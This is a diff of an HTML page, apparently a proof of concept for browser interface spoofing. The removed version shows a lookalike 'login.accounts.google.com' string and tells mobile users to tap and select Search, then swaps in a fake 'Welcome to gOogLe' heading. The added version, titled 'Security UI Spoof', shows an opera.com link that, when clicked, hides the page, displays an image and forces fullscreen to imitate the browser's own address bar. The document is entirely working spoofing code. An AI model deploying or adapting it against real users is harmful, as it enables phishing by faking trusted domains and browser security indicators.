@@ -1,12 +1,41 @@
-<textarea 
-  id="a" 
-  onmousedown="setTimeout(()=>{a.remove();b.innerHTML=`Welcome to gOogLe`},5000)" 
-  style="font-size:220px">
-Ø§ogin.accounts.google.com
-</textarea>
 
-<center>
-  <h1 id="b" style="font-size:88px">
-    Tap and Hold the Text above ↑ and Select Search
-  </h1>
-</center>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+         function x() {
+setTimeout(()=>{
+
+                document.getElementById("spoof").style   = "display: block;";
+                document.getElementById("content").style = "display: none;";
+                document.documentElement.requestFullscreen();
+
+},500)
+            }
+
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="xa.jpg"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Navigate to Opera <a href=# onclick=x()>https://www.opera.com/</h1>
+            </center>
+        </div>
+    </body>
+  </body>
+</html>
